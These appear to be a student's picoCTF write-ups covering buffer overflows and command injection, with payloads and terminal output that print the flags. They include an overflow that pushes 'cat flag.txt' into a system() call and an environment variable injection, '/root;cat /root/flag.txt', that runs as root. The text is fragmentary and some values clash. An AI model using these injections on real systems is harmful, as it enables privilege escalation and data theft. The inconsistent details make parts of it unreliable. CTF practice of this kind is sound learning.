```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
```

## Solve:
- Here I could see that the inputted string and the string `uname` gets passed as parameters to the function `fun`. In that, the newly defined variable `buffer` gets printed and variable `c` gets forwarded to system as a command.
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/picoAF/inputink $ ./vuln
What is your name?
Sparsh
Goodbye, S
```
- I had to somehow create an overflow that made the input go the variable `c`, so I first tried by trial and error and inputted a lot of `A`s to the terminal to see what the command does.
```
sparsh@LAPTOP-F80QI4V2 ~/ctf/picoAF/inputink $ ./vuln
What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
[1]    756 segmentation fault (core dumped)  ./vuln
```
- I could see that after some `A`s, the program throwed two errors, first the usual `Segment Violation` and also `not found` which meant that some part of my input did get leaked as a system command.
- Again looking at the code, I looked at the sizes of the variables `c` and `buffer` which was `10`, so I created an injection of `10` random characters and inputted the system command I want to you, here being `ls`.
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/picoAF/inputink $ nc saffron-estate.picoctf.net 51977
What is your name?
1234567890ls
Goodbye, 1234567890ls!
flag.txt
```
- Hence, in the next iteration I used `cat flag` with the same injection and got the flag.
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/picoAF/inputink $  nc saffron-estate.picoctf.net 55705
What is your name?
1234567890cat flag.txt
Goodbye, 1234567890cat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_8499c65e}
```

## Flag:
```
picoCTF{0v3rfl0w_c0mm4nd_8499c65e}
```

## Notes and Concepts Learnt:
- Trial and error is okay, but I should try to read the code entirely and get the optimal solution before hand

## Solve:
- Having already done `heap 0`, I had the idea that I have to somehow change the `safe variable` to get the flag. This time the `safe var` had to be equal to `pico` to get the flag.
- Let's boot into the challenge and see if we can somehow replace the value of `safe var`
```zsh
1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 1234567890123456789012345678901234567890123456789pico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = 34567890123456789pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit
```
- And after inputting some random characters, I could see that the value of the `safe var` did change, looking at the terminal again, I could see that the overflow was caused after 32 characters.

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x6494dfb092b0  ->   pico
+-------------+----------------+
[*]   0x6494dfb092d0  ->   bico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)

>(binex-medium)

## Solve:
- This challenge required me to connect to a server using `ssh` and somehow get the flag.
- After I booted in, I used `ls` to see the files in my current working directory-
```zsh
ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```
- Here I could see that the file located in `cwd` was an executable file, trying to execute it, it showed an error saying the `SECRET_DIR` environment variable was not set.
- I set up a random directory as the as the `SECRET_DIR` variable and once again ran the executable.
```zsh
ctf-player@pico-chall$ export SECRET_DIR
ctf-player@pico-chall$ ./bin
Listing the content of ./bin as root:
./bin
```
- From this I understood that the executable used the `ls` command on the directory set to `SECRET_DIR`.
- I tried using it on a lot of directories available, I also found one `/challenge` directory which was not accessible through normal `ls` or any other command, it provided three files but was very fruitful.
```zsh
ctf-player@pico-chall$ SECRET_DIR="/challenge"
ctf-player@pico-chall$ ./bin
Listing the content of /challenge as root:
config-box.py  metadata.json  profile
```
- So I looked at the first hint which said to look under the `root`  directory.
```zsh
ctf-player@pico-chall$ SECRET_DIR="/root"
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt
```
- And there it was `flag.txt`, trying to use normal `cat` from the command line didn't work.
```zsh
ctf-player@pico-chall$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
```
- I tried using `/bin/cat` but that also didn't work.
- I got an idea, I could see that the directory I put in `SECRET_DIR` goes through the `ls` command so that means that if I put any other command after the directory name with a `;`, it would result in also executing that program, So I tried to do so.
```zsh
ctf-player@pico-chall$ SECRET_DIR="/root;cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of /root;cat /root/flag.txt as root:
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}
```
- And that actually printed the flag!

## Flag:
```
picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}
```

## Notes and Concepts Learnt:
- The challenge could've been solved without looking at the hints, knowing that the executable had `sudo` privileges, I could've used `find / -name "flag"` with the executable and gotten the exact location the `.txt` file.

    fflush(stdout);
    fclose(fptr);
    exit(0);
  }

  printf("Bye!\n");
  fflush(stdout);
}
```

## Solve:
- Booting into the challenge, I was asked to input a string,
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ nc saturn.picoctf.net 63277
Enter a string: 12345678901234567890

num is 64
Bye!
```
- I tried to create an overflow by inputting some more random characters, After I saw that after 24 characters, the value of `num` gets changed.
- Now I had to figure out what I had to input to get the value to be changed to `65`.
```
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ nc saturn.picoctf.net 63277
Enter a string: 12345678901234567890123410

num is 12337
Bye!

sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ ./local-target
Enter a string: 1234567890123456789012342

num is 50
Bye!

Enter a string: 12345678901234567890123410

num is 12337
Bye!
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ ./local-target
Enter a string: 1234567890123456789012340

num is 48
Bye!
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ ./local-target
Enter a string: 12345678901234567890123411

num is 12593
Bye!
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ ./local-target
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAA12

num is 12849
Bye!
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ ./local-target
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAA

num is 0

```
- From this I incurred that inputting any number from `1` to `9` after 24 characters changed the value to `49` to `57`.
- Something had to inputted that made the value change to `65`, so I tried using different characters.
```
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ ./local-target
Enter a string: 123456789012345678901234E

num is 69

You win!
```
- After finding the correct value, I connected through the `nc` port and got the flag.
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/ltarget $ nc saturn.picoctf.net 60943

## Flag:
```
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

## Notes and Concepts Learnt:
- I did this entirely based off of trial and error, I think a script can be made to automate the entire process which I did.
